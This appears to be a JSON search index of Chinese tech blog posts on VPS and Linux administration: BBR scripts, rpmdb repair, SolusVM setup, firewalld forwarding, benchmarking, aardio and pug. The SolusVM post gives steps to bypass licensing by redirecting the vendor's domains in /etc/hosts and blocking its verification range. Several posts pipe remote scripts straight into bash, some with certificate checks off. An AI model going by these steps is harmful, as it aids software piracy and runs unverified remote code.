bbr，好处是不需要开启 TUN/TAP，对于后台没有或者找不到这个模块的，刚好可以用一下。 要求：OpenVZ架构，64 Bit 系统。 使用方法 在 /home/tcp_nanqinlang 进行安装，所以安装完成后不要动这个文件夹了（除非你想修改端口）。 安装过程中，会提示输入端口号。多个端口号用空格隔开。不支持端口段。 安装完成后，会开启 rinetd-bbr 。以后重启机器也会随开机自启，使用前请注意自己的iptables 相关设置。 Debian or Ubuntu 12345678910111213#适用于单网卡（单IP）服务器：wget https://github.com/tcp-nanqinlang/lkl-rinetd/releases/download/1.1.0/tcp_nanqinlang-rinetd-debianorubuntu.shbash tcp_nanqinlang-rinetd-debianorubuntu.sh#如果提示only support OpenVZ !，则使用下面这个脚本wget https://github.com/tcp-nanqinlang/lkl-rinetd/releases/download/1.1.0-nocheckvirt/tcp_nanqinlang-rinetd-debianorubuntu-nocheckvirt.shbash tcp_nanqinlang-rinetd-debianorubuntu-nocheckvirt.sh#适用于多网卡（多IP）服务器，会为所有网卡（所有IP）提供加速：wget https://github.com/tcp-nanqinlang/lkl-rinetd/releases/download/1.1.0/tcp_nanqinlang-rinetd-debianorubuntu-multiNIC.shbash tcp_nanqinlang-rinetd-debianorubuntu-multiNIC.sh#如果提示only support OpenVZ !，则使用下面这个脚本wget https://github.com/tcp-nanqinlang/lkl-rinetd/releases/download/1.1.0-nocheckvirt/tcp_nanqinlang-rinetd-debianorubuntu-nocheckvirt-multiNIC.shbash tcp_nanqinlang-rinetd-debianorubuntu-nocheckvirt-multiNIC.sh CentOS 7 1234567891011121314#和上面一样，也分单网卡和多网卡版本#单网卡wget https://github.com/tcp-nanqinlang/lkl-rinetd/releases/download/1.1.0/tcp_nanqinlang-rinetd-centos.shbash tcp_nanqinlang-rinetd-centos.sh#如果提示only support OpenVZ !，则使用下面这个脚本wget https://github.com/tcp-nanqinlang/lkl-rinetd/releases/download/1.1.0-nocheckvirt/tcp_nanqinlang-rinetd-centos-nocheckvirt.shbash tcp_nanqinlang-rinetd-centos-nocheckvirt.sh#多网卡wget https://github.com/tcp-nanqinlang/lkl-rinetd/releases/download/1.1.0/tcp_nanqinlang-rinetd-centos.shbash tcp_nanqinlang-rinetd-centos.sh#如果提示only support OpenVZ !，则使用下面这个脚本wget https://github.com/tcp-nanqinlang/lkl-rinetd/releases/download/1.1.0-nocheckvirt/tcp_nanqinlang-rinetd-debianorubuntu-nocheckvirt-multiNIC.shbash tcp_nanqinlang-rinetd-debianorubuntu-nocheckvirt-multiNIC.sh 参考文档 OpenVZ平台魔改BBR一键脚本之Rinetd方式 BBR开启方法整理","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"},{"name":"shell","slug":"shell","permalink":"https://sobaigu.com/tags/shell/"}]},{"title":"修复yum提示 Error: rpmdb open failed","slug":"linux-rebuild-rpm-database","date":"2021-02-12T07:33:36.000Z","updated":"2021-02-12T07:33:36.000Z","comments":true,"path":"linux-rebuild-rpm-database.html","permalink":"https://sobaigu.com/linux-rebuild-rpm-database.html","excerpt":"在CentOS系统上，在使用 yum 命令安装软件包或升级时候报以下错误： 1234567error: rpmdb: BDB0113 Thread/process 31238/139881131583552 failed: BDB1507 Thread died in Berkeley DB libraryerror: db5 error(-30973) from dbenv-&gt;failchk: BDB0087 DB_RUNRECOVERY: Fatal error, run database recoveryerror: cannot open Packages index using db5 - (-30973)error: cannot open Packages database in /var/lib/rpmCRITICAL:yum.main:Error: rpmdb open failed","text":"在CentOS系统上，在使用 yum 命令安装软件包或升级时候报以下错误： 1234567error: rpmdb: BDB0113 Thread/process 31238/139881131583552 failed: BDB1507 Thread died in Berkeley DB libraryerror: db5 error(-30973) from dbenv-&gt;failchk: BDB0087 DB_RUNRECOVERY: Fatal error, run database recoveryerror: cannot open Packages index using db5 - (-30973)error: cannot open Packages database in /var/lib/rpmCRITICAL:yum.main:Error: rpmdb open failed 错误可能会有稍许差异，但都会提示 error: cannot open Packages database in /var/lib/rpm ，发生以上错误原因是RPM数据库损坏。 按照以下命令重建数据库后恢复正常： 1234cd /var/lib/rpm/for i in `ls | grep &#x27;db.&#x27;`;do mv $i $i.bak;donerpm --rebuilddbyum clean all","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"Solusvm开心版一键安装脚本","slug":"whmcs-solusvm-1-click","date":"2021-02-01T13:52:32.000Z","updated":"2021-02-01T13:52:32.000Z","comments":true,"path":"whmcs-solusvm-1-click.html","permalink":"https://sobaigu.com/whmcs-solusvm-1-click.html","excerpt":"Solusvm开心版一键安装脚本，支持CentOS 7一键换内核到OpenVZ 7。想了解详细安装过程及原理的请参考：SolusVM主被控开心版完美安装配置傻瓜式教程","text":"Solusvm开心版一键安装脚本，支持CentOS 7一键换内核到OpenVZ 7。想了解详细安装过程及原理的请参考：SolusVM主被控开心版完美安装配置傻瓜式教程 安装 后台面板（用户名和默认密码都是vpsadmin） 1https://服务器IP:5656/admincp 或者 1https://服务器IP/admincp 普通用户自己访问 /login.php 就好了 话不多说，直接上命令： 1yum install wget -y &amp;&amp; wget https://www.zeroteam.top/files/solusvm.sh &amp;&amp; bash solusvm.sh 如果开 OpenVZ 的小鸡记得选带模板的。 NAT 执行以下命令即可，Solusvm后台地址池为 10.0.1.0/24 ，网关 10.0.1.1 ，地址池为 10.0.1.2-10.0.1.254 ： 1yum install wget -y &amp;&amp; wget https://www.zeroteam.top/files/addnat.sh &amp;&amp; bash addnat.sh 端口规则 预分配10个端口+1个SSH端口，内外网端口一致 IP地址： 10.0.1.x SSH端口： 61x （不足5位用0补齐） NAT端口： 1x0-1x9（不足5位用0补齐） 举个栗子，开个小鸡鸡，分配的资源如下： IP地址： 10.0.1.2 SSH端口： 61002 NAT端口： 10020-10029 参考文档 出自：Solusvm开心版一键安装脚本","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"shell","slug":"shell","permalink":"https://sobaigu.com/tags/shell/"}]},{"title":"SolusVM主被控开心版完美安装配置傻瓜式教程","slug":"whmcs-solusvm-crack-installer","date":"2021-02-01T13:16:44.000Z","updated":"2021-02-01T13:16:44.000Z","comments":true,"path":"whmcs-solusvm-crack-installer.html","permalink":"https://sobaigu.com/whmcs-solusvm-crack-installer.html","excerpt":"","text":"前言 SolusVM分为主控和被控，主控为管理所有主机，VPS、独服均可。被控为主机，需为独服。 网上有Solusvm开心版一键安装脚本，支持CentOS 7一键换内核到OpenVZ 7 ，想了解的可查看 Solusvm开心版一键安装脚本，此处更多的是记录过程及原理。 SolusVM主控 安装SolusVM主控 12wget https://files.soluslabs.com/install.shsh install.sh 如果开 OpenVZ 的小鸡记得选带模板的，也就是 OpenVZ with basic templates 这个选项。 安装完后会出现SolusVM控制台地址、用户名、密码等，记录下来。默认后台面板 https://服务器IP:5656/admincp 或者 https://服务器IP/admincp ，用户名和默认密码都是 vpsadmin ，普通用户自己访问 /login.php 就好了。 破解SolusVM主控 添加伪授权hosts 在 /etc/hosts 中添加如下伪授权，套餐是 SolusVM Enterprise (NOC) ： 12345678150.95.9.225 soluslabs.com150.95.9.225 www.soluslabs.com150.95.9.225 licensing1.soluslabs.net150.95.9.225 licensing2.soluslabs.net150.95.9.225 licensing3.soluslabs.net150.95.9.225 licensing4.soluslabs.net150.95.9.225 licensing5.soluslabs.net150.95.9.225 licensing6.soluslabs.net 或者套餐是 SolusVM Enterprise (RS) ： 12345678150.95.9.221 soluslabs.com150.95.9.221 www.soluslabs.com150.95.9.221 licensing1.soluslabs.net150.95.9.221 licensing2.soluslabs.net150.95.9.221 licensing3.soluslabs.net150.95.9.221 licensing4.soluslabs.net150.95.9.221 licensing5.soluslabs.net150.95.9.221 licensing6.soluslabs.net 防火墙屏蔽验证地址 1iptables -I INPUT -s 94.0.0.0/8 -j DROP 保存 iptables 配置并重启服务： 12service iptables saveservice iptables restart 关闭 selinux ：vi /etc/sysconfig/selinux ，把 SELINUX 设为 disabled ： 1SELINUX=disabled 配置SSL 获取证书 123yum install curl &amp;&amp;curl https://get.acme.sh | sh &amp;&amp; source ~/.bashrc acme.sh --issue -d 域名 -w /usr/local/solusvm/www/.verification 安装证书 1234567acme.sh --installcert -d 域名 --keypath /usr/local/svmstack/nginx/ssl/ssl.key --fullchainpath /usr/local/svmstack/nginx/ssl/ssl.crt --reloadcmd &quot;service svmstack-nginx restart; /usr/local/svmstack/sshwebsocket/quit; /usr/local/svmstack/sshwebsocket/port_check; cd /usr/local/svmstack/nginx/ssl &amp;&amp; cat ssl.key ssl.crt &gt; ssl.pem&quot; 证书安装完成后，浏览器进入web控制端可见控制端状态。 SolusVM被控 安装SolusVM被控 12wget https://files.soluslabs.com/install.shsh install.sh 几分钟后会出现选择，根据自己的需要，选择： 4 ：KVM 5 ：Xen 6 ：OpenVZ 安装后会出现下面这样的信息，记住！ 破解SolusVM被控 添加伪授权 hosts : 12345678150.95.9.225 soluslabs.com150.95.9.225 www.soluslabs.com150.95.9.225 licensing1.soluslabs.net150.95.9.225 licensing2.soluslabs.net150.95.9.225 licensing3.soluslabs.net150.95.9.225 licensing4.soluslabs.net150.95.9.225 licensing5.soluslabs.net150.95.9.225 licensing6.soluslabs.net 或者 12345678150.95.9.221 soluslabs.com150.95.9.221 www.soluslabs.com150.95.9.221 licensing1.soluslabs.net150.95.9.221 licensing2.soluslabs.net150.95.9.221 licensing3.soluslabs.net150.95.9.221 licensing4.soluslabs.net150.95.9.221 licensing5.soluslabs.net150.95.9.221 licensing6.soluslabs.net SolusVM KVM的网桥设置 官方文档：https://documentation.solusvm.com/display/DOCS/KVM+Bridge+Setup 安装桥接依赖 1yum -y install bridge-utils 开ipv4转发： 1echo 1 &gt; /proc/sys/net/ipv4/ip_forward 新建一个桥接网卡，命名为 br0 1vi /etc/sysconfig/network-scripts/ifcfg-br0 粘贴下面的内容。如果没有 IPv6 ，删除 IPv6 的部分 1234567891011DEVICE=br0TYPE=BridgeBOOTPROTO=staticIPADDR=服务器主IPNETMASK=255.255.255.248 ##如果是/29，最后3位是248，根据IP数修改ONBOOT=yesGATEWAY=网关IPV6INIT=yesIPV6ADDR=服务器IPV6地址IPV6_DEFAULTGW=fe80::1IPV6_DEFAULTDEV=br0 编辑默认网卡（有的是eth0，有的是eth1） 1vi /etc/sysconfig/network-scripts/ifcfg-eth1 粘贴下面的内容: 123DEVICE=eth1ONBOOT=yesBRIDGE=br0 添加其他IP 1vi /etc/sysconfig/network-scripts/ifcfg-br0:0 添加如下内容（网关根据IP数修改） 1234567891011DEVICE=br0:0BOOTPROTO=staticIPADDR=服务器IP2NETMASK=255.255.255.248IPADDR2=服务器IP3NETMASK2=255.255.255.248IPADDR3=服务器IP4NETMASK3=255.255.255.248IPADDR4=服务器IP8NETMASK4=255.255.255.248ONBOOT=yes 重启网络 1service network restart 系统下载 https://tdn.solusvm.com/ 参考链接 SolusVM主被控开心版完美安装配置傻瓜式教程","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"shell","slug":"shell","permalink":"https://sobaigu.com/tags/shell/"}]},{"title":"使用firewalld在NAT上中转「转」","slug":"firewalld-forword-ports-with-nat","date":"2021-01-19T12:25:32.000Z","updated":"2021-01-19T12:25:32.000Z","comments":true,"path":"firewalld-forword-ports-with-nat.html","permalink":"https://sobaigu.com/firewalld-forword-ports-with-nat.html","excerpt":"","text":"前言 败了台nat鸡，以前没玩过，准备些资料，后面慢慢摸索。gost「已经玩过了」 ，brook「还没机会玩」， haproxy「暂时没玩转」 都挺好，但按理说 firewalld 直接在内核执行，转发效率应该更高，待实际验证。 检查状态 1firewall-cmd --state 如果输出：running ，则进入下一步。否则 123yum install -y firewalldsystemctl enable firewalldsystemctl start firewalld 配置转发 12345678910111213echo &#x27;net.ipv4.ip_forward = 1&#x27; &gt;&gt; /etc/sysctl.confsysctl -pfirewall-cmd --permanent --add-masquerade# 开放端口# 7788可以改成其他端口firewall-cmd --permanent --add-port=7788/tcpfirewall-cmd --permanent --add-port=7788/udp# 设置转发# 7788和上面保持一致，落地ip改成你落地vps的ip，443可以改成落地科学软件的端口firewall-cmd --permanent --add-forward-port=port=7788:proto=tcp:toaddr=落地ip:toport=443firewall-cmd --permanent --add-forward-port=port=7788:proto=udp:toaddr=落地ip:toport=443firewall-cmd --reload 举个栗子 123firewall-cmd --permanent --add-forward-port=port=7788:proto=tcp:toaddr=8.8.8.8:toport=443firewall-cmd --permanent --add-forward-port=port=7788:proto=udp:toaddr=8.8.8.8:toport=443firewall-cmd --reload 如果中转 小马 流量，记得把客户端配置文件中的 两个 verify 选项设置为false ！","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"firewalld端口放行、转发常用操作命令","slug":"firewall-cmd-ports-forward","date":"2020-12-31T05:53:26.000Z","updated":"2020-12-31T05:53:26.000Z","comments":true,"path":"firewall-cmd-ports-forward.html","permalink":"https://sobaigu.com/firewall-cmd-ports-forward.html","excerpt":"","text":"前言 firewalld 在centos和ubuntu上已经是标配了，整理几个常用的操作，方便日后使用。 放行端口&amp;转发端口 开放TCP/UDP端口： 12firewall-cmd --zone=public --add-port=端口/tcp --permanentfirewall-cmd --zone=public --add-port=端口/udp --permanent 启用转发端口： 1firewall-cmd --add-masquerade --permanent 添加TCP/UDP端口转发： 12firewall-cmd --add-forward-port=port=本地端口:proto=tcp:toaddr=目的IP:toport=目的端口 --permanentfirewall-cmd --add-forward-port=port=本地端口:proto=udp:toaddr=目的IP:toport=目的端口 --permanent 按服务放行 1234firewall-cmd --get-services #查询所有支持的服务firewall-cmd --query-service ftp #查询是否支持ftp服务，返回yes或者nofirewall-cmd --zone=public --add-service=http --permanent #放行http服务 其实一个服务对应一个端口，每个服务对应 /usr/lib/firewalld/services 下面一个 xml 文件，如果开启了某个服务并放行了对应端口，但是没有绑定firewall中对应的服务,则不能通过外网访问。 所以当修改了服务的默认端口后，仍希望通过放行端口来实现，则需要将对应服务 xml 中端口同步修改。 禁用端口&amp;删除转发 删除TCP/UDP端口： 12firewall-cmd --zone=public --remove-port=端口/tcp --permanentfirewall-cmd --zone=public --remove-port=端口/udp --permanent 删除端口转发： 123456#禁用转发端口firewall-cmd --remove-masquerade --permanent#删除TCP端口转发firewall-cmd --remove-forward-port=port=本地端口:proto=tcp:toaddr=目的IP:toport=目的端口 --permanent#删除UDP端口转发firewall-cmd --remove-forward-port=port=本地端口:proto=udp:toaddr=目的IP:toport=目的端口 --permanent 常规操作命令 应用配置：firewall-cmd --reload 启动防火墙：systemctl start firewalld 开机自启动：systemctl enable firewalld 关闭防火墙：systemctl stop firewalld 关闭开机自启动：systemctl disable firewall","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"hexo 命令在 PowerShell 上无法执行的解决办法","slug":"hexo-con-not-process-in-powershell","date":"2020-12-26T06:26:33.000Z","updated":"2020-12-26T06:26:33.000Z","comments":true,"path":"hexo-con-not-process-in-powershell.html","permalink":"https://sobaigu.com/hexo-con-not-process-in-powershell.html","excerpt":"","text":"前言 在新系统上装了hexo环境，可打开系统默认的PowerShell运行命令却无法识别，以为是系统环境变量没设置好。可在 Git bash 和 CMD 终端却可以执行，再仔细看PowerShell中的提示，原来是提示的无法加载文件，因此在此系统上禁止运行脚本。 现象提示 安装好 npm 和 hexo 后，在 PowerShell 终端运行 npm version 没问题，运行 hexo version 则提示如下： 12hexo : 无法加载文件 C:\\Users\\username\\AppData\\Roaming\\npm\\hexo.ps1`，因为在此系统上禁止运行脚本。有关详细信息，请参阅 https:/go.microsoft.com/fwlink/?LinkID=135170 中的 `about_Execution_Policies`。所在位置 行:1 字符: 1 此时，在 CMD 中执行以上命令都没问题，所以不是系统环境变量的问题。 解决办法 用管理员权限打开 PowerShell ，运行以下命令： 1Set-ExecutionPolicy -ExecutionPolicy UNRESTRICTED 会有一串安全警示，输入 y 回车，然后就可以愉快地在 PowerShell 中使用 hexo 了。","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"},{"name":"Hexo","slug":"Hexo","permalink":"https://sobaigu.com/tags/Hexo/"}]},{"title":"VPS服务器自动测评脚本收集","slug":"bench-for-vps","date":"2020-12-22T07:22:57.000Z","updated":"2020-12-22T07:22:51.000Z","comments":true,"path":"bench-for-vps.html","permalink":"https://sobaigu.com/bench-for-vps.html","excerpt":"平时测试VPS的时候一直是靠着商家给的控制台来看的，偶尔跑跑 Bench.sh 来测试的，最近看到 SuperBench 和 Zench 也很方便。他们自己把常见的功能脚本结合在一起，然后加入 Ping 以及 路由测试 功能。 比较懒人，简单快捷，方便VPS测评站的朋友们使用。因为会生成测评报告，可以很方便地分享给其他朋友看自己的测评数据。","text":"平时测试VPS的时候一直是靠着商家给的控制台来看的，偶尔跑跑 Bench.sh 来测试的，最近看到 SuperBench 和 Zench 也很方便。他们自己把常见的功能脚本结合在一起，然后加入 Ping 以及 路由测试 功能。 比较懒人，简单快捷，方便VPS测评站的朋友们使用。因为会生成测评报告，可以很方便地分享给其他朋友看自己的测评数据。 SuperBench 一键测试服务器的基本参数 1curl -Lso- -no-check-certificate https://raw.githubusercontent.com/oooldking/script/master/superbench.sh | bash LemonBench 一款 Linux 服务器综合性能测试工具脚本，快速测试： 1curl -fsL https://ilemonra.in/LemonBenchIntl | bash -s fast 完整测试： 1curl -fsSL https://ilemonrain.com/download/shell/LemonBench.sh | bash -s full ZBench 可以使用以下命令来查看您的 Linux 系统信息，还可以测试网络带宽及硬盘读写速率。如果中文版出现乱码等情况，请换成英文版。 中文版： 1wget -N --no-check-certificate https://raw.githubusercontent.com/FunctionClub/ZBench/master/ZBench-CN.sh &amp;&amp; bash ZBench-CN.sh 英文版： 1wget -N --no-check-certificate https://raw.githubusercontent.com/FunctionClub/ZBench/master/ZBench.sh &amp;&amp; bash ZBench.sh 脚本源汇总 Bench.sh SuperBench Zench python实现ping程序 Python 设置颜色","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"shell","slug":"shell","permalink":"https://sobaigu.com/tags/shell/"}]},{"title":"从零开始学aardio笔记：IDE常用快捷","slug":"aardio-notes-05","date":"2020-12-20T07:22:57.000Z","updated":"2024-09-28T00:17:21.269Z","comments":true,"path":"aardio-notes-05.html","permalink":"https://sobaigu.com/aardio-notes-05.html","excerpt":"ctrl + 左右方向键：光标单词间跳转 ctrl + G：行号间跳转 ctrl + HOME：光标跳转到文档开头 ctrl + END：光标跳转到文档结尾 ctrl + DEL：删除光标右侧单词 HOME：光标跳转到行首 END：光标跳转到行尾","text":"ctrl + 左右方向键：光标单词间跳转 ctrl + G：行号间跳转 ctrl + HOME：光标跳转到文档开头 ctrl + END：光标跳转到文档结尾 ctrl + DEL：删除光标右侧单词 HOME：光标跳转到行首 END：光标跳转到行尾 shift + HOME：选中文本到光标左侧 shift + END：选中文本到光标右侧 shift + 方向键：选中代码 tab：增加缩进 shift + tab：减少缩进 ctrl + 上下方向键：控制滚动条 ctrl + tab：文档间切换 ctrl + 鼠标滚轮：控制编辑器字体大小 F2：上一个书签 shift + F2：下一个书签 ctrl + K,k：在当前行插入或者删除书签 ctrl + k,l：删除当前文档全部书签 ctrl + k,c：插入注释 ctrl + k,u：取消注释 ctrl + u：可视化/源码 视图切换","categories":[{"name":"学编程","slug":"学编程","permalink":"https://sobaigu.com/categories/%E5%AD%A6%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"aardio","slug":"aardio","permalink":"https://sobaigu.com/tags/aardio/"}]},{"title":"网页模板 pug 基本语法","slug":"hexo-pug-notes","date":"2020-12-10T07:22:57.000Z","updated":"2020-12-10T07:22:51.000Z","comments":true,"path":"hexo-pug-notes.html","permalink":"https://sobaigu.com/hexo-pug-notes.html","excerpt":"","text":"前言 pug 原名 jade ，因版权问题更名为 pug ，即哈巴狗。与 hexo 默认模块 ejs 一样，pug 也是一个模板引擎，可用于快速的网站开发，当然也可以用于静态博客网站的设计。本站点现时所用主题 manupassant 也使用了 pug 。 本文针对 Hexo 中使用 pug 的情况为例，说明其基本语法。 安装 12345# common installnpm install pug# install for hexo blognpm install hexo-renderer-pug --save 语法 pug 不同于 html ，前者不需要标签的开和闭，如 html 的 &lt;p&gt;Demo&lt;/p&gt; ，在 pug 使用 p Demo 即可。 缩进 pug 对空格敏感，有点类似 python 对制表符tab敏感。pug 使用空格作为缩进符，当然用 soft tab 也可行。同一级标签需保证左对齐。 123div p Hello, world! p Hello, pug. 渲染结果如下： 1234&lt;div&gt; &lt;p&gt;Hellow, world!&lt;/p&gt; &lt;p&gt;Hello, pug.&lt;/p&gt;&lt;/div&gt; 注释 pug 使用 //- 或 // 对代码进行注释，前者注释内容不出现在渲染后的 html 文件中，后者反之。 12//- html中不包含此行// html中会包含此行 属性 pug 将标签属性存放于括号 () 内，多个属性之间以 逗号 或 空格 分隔。此外，对于标签的 id 和 class ，pug 使用 # 紧跟标签 id ,使用 . 紧跟标签 class ，可以同时设置多个 class 。 12h1#title Test titleimg#name.class1.class2(src=&quot;/test.png&quot; alt=&quot;test&quot;) 渲染结果如下： 12&lt;h1 id=&quot;title&quot;&gt;Test title&lt;/h1&gt;&lt;img id=&quot;name&quot; class=&quot;class1 class2&quot; src=&quot;/test.png&quot; alt=&quot;test&quot;&gt; 包含 为了方便代码复用，pug 提供了 include 包含功能，以下代码会将 _partial 目录下的 head.pug 文件内容包含到当前调用的位置。有点 C/C++ 中内联函数的意思。 123doctype htmlhtml(lang=&#x27;en&#x27;) include _partial/head.pug 继承 下面是一个简单的 base 模板，通过 block 定义了页面头部 head 和内容 body 。块 block 有点类似 C/C++ 的抽象函数，需要在继承者中完成定义，填充具体内容。 123456//- base.pughtml head block title body block content 以下文件使用 extends 继承以上模板，通过 block 覆盖或替换原有块 block 。当然，继承者也可以在原有基础上继续扩展。 123456789//- index.pugextends base.pugblock title title &quot;Test title&quot;block content h1 Hello world! block article 定义变量 pug中通过 - var name = value 的形式定义变量 123456- var intData = 100- var boolData = false- var stringData = &#x27;Test&#x27;p.int= intDatap.bool= boolDatap.stringData= stringData 需注意的是，在引用变量时，需要在引用位置加上=号，否则会默认将变量名当成普通字符串使用。 如果想要将变量与其它字符串常量或是变量连接在一起，就不能用等号了，而是应该用 #&#123;&#125; ，该符号会对大括号内的变量进行求值和转义，最终得到渲染输出的内容。 1234- var girl = &#x27;Lily&#x27;- var boy = &#x27;Jack&#x27;p #&#123;girl&#125; is so beautiful!p And #&#123;boy&#125; is handsome. 条件结构 pug 的条件语句与其它语言类似，均是如下这般： 12345678- var A = &#123;value: &#x27;Test&#x27;&#125;- var B = trueif A.value p= A.valueelse if B p= Belse p nothing 迭代 pug 中使用 each 和 while 实现循环迭代，each 可以返回当前所在项的索引值，默认从 0 开始计数。 12345678910//- eachol each item in [&#x27;Sun&#x27;, &#x27;Mon&#x27;, &#x27;Tus&#x27;, &#x27;Wen&#x27;, &#x27;Thu&#x27;, &#x27;Fri&#x27;, &#x27;Sat&#x27;] li= item//- get index of each- var week = [&#x27;Sun&#x27;, &#x27;Mon&#x27;, &#x27;Tus&#x27;, &#x27;Wen&#x27;, &#x27;Thu&#x27;, &#x27;Fri&#x27;, &#x27;Sat&#x27;]ol each item, index in week li= index + &#x27;:&#x27; + item 渲染成 html 后： 123456789101112131415161718&lt;ol&gt; &lt;li&gt;Sun&lt;/li&gt; &lt;li&gt;Mon&lt;/li&gt; &lt;li&gt;Tus&lt;/li&gt; &lt;li&gt;Wen&lt;/li&gt; &lt;li&gt;Thu&lt;/li&gt; &lt;li&gt;Fri&lt;/li&gt; &lt;li&gt;Sat&lt;/li&gt;&lt;/ol&gt;&lt;ol&gt; &lt;li&gt;0:Sun&lt;/li&gt; &lt;li&gt;1:Mon&lt;/li&gt; &lt;li&gt;2:Tus&lt;/li&gt; &lt;li&gt;3:Wen&lt;/li&gt; &lt;li&gt;4:Thu&lt;/li&gt; &lt;li&gt;5:Fri&lt;/li&gt; &lt;li&gt;6:Sat&lt;/li&gt;&lt;/ol&gt; while 调用方式如下： 12345//- while- var day = 1ul while day &lt; 7 li= day++ Minix mixin 名曰混入，类似其它编程语言中的函数，也是为了代码复用，可带参数或不带参数，定义方式如下： 1234mixin menu-item(href, name) li span.dot ● a(href=href)= name 其中，menu-item 为调用时所用名称，可认为是函数名，href 及 name 是参数。同上定义变量所说，a(href=href)= name 中第二个 = 是为了将后面的 name 当作参数来处理，而不是当作字符串 &quot;name&quot; 来处理。 调用 mixin 定义的代码块，需通过 + 号紧跟 mixin 名称及参数: 12+menu-item(&#x27;/Archives&#x27;,&#x27;Archives&#x27;)+menu-item(&#x27;/About&#x27;,&#x27;About&#x27;) mixin 之所以称为混入，是因为其语法不局限于函数调用，在 mixin 可以使用块 block 12345678910mixin print(post) if block block else p= post+print(&quot;no block&quot;)+print(&quot;&quot;) div.box p this is the content of block 对应 html 代码： 12&lt;p&gt;no block&lt;/p&gt;&lt;div class=&quot;box&quot;&gt;&lt;p&gt;this is the content of block&lt;/p&gt;&lt;/div&gt; JavaScript 注意以下 pug 语句中第一行的 . 号。 1234567script(type=&#x27;text/javascript&#x27;). var data = &quot;Test&quot; var enable = true if enable console.log(data) else console.log(&#x27;nothing&#x27;) 对应的 JS 代码如下： 12345678&lt;script type=&#x27;text/javascript&#x27;&gt; var data = &quot;Test&quot; var enable = true if enable console.log(data) else console.log(&#x27;nothing&#x27;)&lt;/script&gt; 对于简单脚本，使用 pug 尚可，复杂的还是单独写到 .js 文件中，然后通过 pug 引用方便一些，引用方式如下： 1234script(type=&#x27;text/javascript&#x27;, src=&#x27;/path/to/js&#x27;)//- with hexo function url_forscript(type=&#x27;text/javascript&#x27;, src=url_for(theme.js) + &#x27;/ready.js&#x27;) hexo 相关 在 hexo 主题中使用 pug 时，可以通过使用 hexo 提供的全局变量 config ， theme 来分别调用博客根目录下 _config.yml 文件中的参数以及主题根目录下 _config.yml 文件中的参数。 12345//- blog configp= config.description//- theme configp= theme.title 当然，pug 中可以直接使用 hexo 提供的其它全局变量及辅助函数，使用方法详见 hexo 的文档。 示例 12345678910111213//- head.pughead meta(http-equiv=&#x27;content-type&#x27;, content=&#x27;text/html; charset=utf-8&#x27;) meta(content=&#x27;width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0&#x27;, name=&#x27;viewport&#x27;) meta(content=&#x27;yes&#x27;, name=&#x27;apple-mobile-web-app-capable&#x27;) meta(content=&#x27;black-translucent&#x27;, name=&#x27;apple-mobile-web-app-status-bar-style&#x27;) meta(content=&#x27;telephone=no&#x27;, name=&#x27;format-detection&#x27;) meta(name=&#x27;description&#x27;, content=config.description) block title link(rel=&#x27;stylesheet&#x27;, type=&#x27;text/css&#x27;, href=url_for(theme.css) + &#x27;/style.css&#x27; + &#x27;?v=&#x27; + theme.version) link(rel=&#x27;Shortcut Icon&#x27;, type=&#x27;image/x-icon&#x27;, href=url_for(&#x27;favicon.png&#x27;)) script(type=&#x27;text/javascript&#x27;, src=&#x27;//cdn.bootcdn.net/ajax/libs/jquery/3.3.1/jquery.min.js&#x27;) block more 12345678910111213141516//- base.pugdoctype htmlhtml(lang=&#x27;en&#x27;) include _partial/head.pug block more link(rel=&#x27;stylesheet&#x27;, type=&#x27;text/css&#x27;, href=url_for(theme.plugins) + &#x27;/prettify/doxy.css&#x27;) script(type=&#x27;text/javascript&#x27;, src=url_for(theme.js) + &#x27;/ready.js&#x27; + &#x27;?v=&#x27; + theme.version, async) //- body body: #container.box .h-wrapper include _partial/nav-menu.pug // article content block content include _partial/footer.pug 其中: theme.* 为主题配置文件 _config.yml 中的参数 url_for 为 hexo 提供的用于查找资源路径的函数 总结 pug 提供了 包含 ，继承 ，Mixin 等多种方式用于代码复用，语法简洁易懂，除了初学时需花费一些时间学习各种标点符号的含义外，其它倒也没有太大困难。 当然啦，pug 还有许多其它特性，但就我目前使用情况而言，以上这些便已足够。 参考 pugjs.org hexo.io/zh-cn/docs/ 原文出处 作者：litreily 链接：https://juejin.cn/post/6844903668383236104 来源：掘金 著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","categories":[{"name":"学编程","slug":"学编程","permalink":"https://sobaigu.com/categories/%E5%AD%A6%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"}]},{"title":"从零开始学aardio笔记：reduce详解","slug":"aardio-notes-04","date":"2020-12-09T07:22:57.000Z","updated":"2020-12-09T07:22:51.000Z","comments":true,"path":"aardio-notes-04.html","permalink":"https://sobaigu.com/aardio-notes-04.html","excerpt":"","text":"前言 做了个抓取网页表格数据的功能，师兄推荐了reduce 这个写法，不会，不懂，没接触过，做个笔记。 